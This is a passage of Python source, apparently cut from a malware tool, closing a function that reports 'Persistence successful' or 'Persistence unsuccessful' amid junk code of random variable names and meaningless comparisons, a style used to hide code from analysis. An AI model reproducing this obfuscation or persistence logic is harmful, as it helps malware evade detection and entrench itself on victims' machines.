        XEkjNYcTbgvCEMvcoyVGQJSfnbMbZQjP = 'Persistence successful, {}.'.format(VxYScffcXbzwIViwIQoUaISRXuFonWpW)
        XKGUZEEawHgzhVEQxavUwPlouaqslOct = 'XdPPtfuxBSfcNckfyOmPsUVQZCMzXZwN'
        gWwPJeGASBBbyKiqsVKFJLFrMoKUDnVo = 'ykMqXVFPxInEzyqXFbUlHzNOOWucqfBI'
        if XKGUZEEawHgzhVEQxavUwPlouaqslOct != gWwPJeGASBBbyKiqsVKFJLFrMoKUDnVo:
            ZCAPfNjvMJMWMUoYboUJvEEcIjoKtBnU = 'CqywvezvtjpMYHwnoIdBdhwDfsCGBEDq'
            UqDxtatKareEHsTQCgMNQZJvPYjOgLHC = 'BNTNZVWLCbpEJzjvGFqGsAtRnNzeRPRr'
            UqDxtatKareEHsTQCgMNQZJvPYjOgLHC = ZCAPfNjvMJMWMUoYboUJvEEcIjoKtBnU
    else:
        LaYDbjWKOyyKQZjsgBZBPHZHvLryEZsu = 'SPUwBaZVOMJPNGguLxyYggKoHQtlVZDK'
        GShESjDNNKDvVQIksxRGsFefaRuyaNVO = 'WiPGEAVuzvxvREYNrHRkdhMbLCqrLcPU'
        pwQlHEodDovEhSnNqfHgIvWXdMLMBEmJ = 'iNKatODCSxtfwFakprUdhaJDZvvkCOtd'
        YluzAiljfqZTBlFxXLPXOiEGjbUCvYyr = 'DvuOJXirJCbfPeAbxIbpKZShYobhfLMF'
        IBguWmyKBRRiNJsCYwOxrCkUqIOjJqVv = 'ykyzVPkivoJiUOXAsveTDJXXVoSmrbzk'
        if LaYDbjWKOyyKQZjsgBZBPHZHvLryEZsu in GShESjDNNKDvVQIksxRGsFefaRuyaNVO:
            LaYDbjWKOyyKQZjsgBZBPHZHvLryEZsu = IBguWmyKBRRiNJsCYwOxrCkUqIOjJqVv
            if GShESjDNNKDvVQIksxRGsFefaRuyaNVO in pwQlHEodDovEhSnNqfHgIvWXdMLMBEmJ:
                GShESjDNNKDvVQIksxRGsFefaRuyaNVO = YluzAiljfqZTBlFxXLPXOiEGjbUCvYyr
        elif GShESjDNNKDvVQIksxRGsFefaRuyaNVO in LaYDbjWKOyyKQZjsgBZBPHZHvLryEZsu:
            pwQlHEodDovEhSnNqfHgIvWXdMLMBEmJ = GShESjDNNKDvVQIksxRGsFefaRuyaNVO
            if pwQlHEodDovEhSnNqfHgIvWXdMLMBEmJ in GShESjDNNKDvVQIksxRGsFefaRuyaNVO:
                GShESjDNNKDvVQIksxRGsFefaRuyaNVO = IBguWmyKBRRiNJsCYwOxrCkUqIOjJqVv
        XEkjNYcTbgvCEMvcoyVGQJSfnbMbZQjP = 'Persistence unsuccessful, {}.'.format(VxYScffcXbzwIViwIQoUaISRXuFonWpW)
        IGlQDghYtyZGVbbqcSOoBeqrMXzxVykb = 'MYPoDCbntQGzMDUHqfQPwErLuNjwmzfQ'
        QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA = 'NVKfPehcseCvkLKDXfzGpGacPkcDmIve'
        RRAtXGGxqvhNRGzXrMXxktXofZPpEPro = 'TPzChFsikdxFVBFoyLsppiaPDFxKtYBE'
        jEZTADxRcaNclkRpRfPJfIHjZKtsHtWB = 'ZKSNXzlgrKEInDdumVvBCfCEprvEILXw'
        EernTxRKsaKLqjVEoUJzonyREfZzBLZH = 'QSTllevMmjzwZZEqwxabAvZiCRFkywca'
        if IGlQDghYtyZGVbbqcSOoBeqrMXzxVykb in QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA:
            IGlQDghYtyZGVbbqcSOoBeqrMXzxVykb = EernTxRKsaKLqjVEoUJzonyREfZzBLZH
            if QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA in RRAtXGGxqvhNRGzXrMXxktXofZPpEPro:
                QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA = jEZTADxRcaNclkRpRfPJfIHjZKtsHtWB
        elif QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA in IGlQDghYtyZGVbbqcSOoBeqrMXzxVykb:
            RRAtXGGxqvhNRGzXrMXxktXofZPpEPro = QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA
            if RRAtXGGxqvhNRGzXrMXxktXofZPpEPro in QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA:
                QhWMxNuhJIotqkLyjdTcPkCSsgNvTPcA = EernTxRKsaKLqjVEoUJzonyREfZzBLZH
    return XEkjNYcTbgvCEMvcoyVGQJSfnbMbZQjP
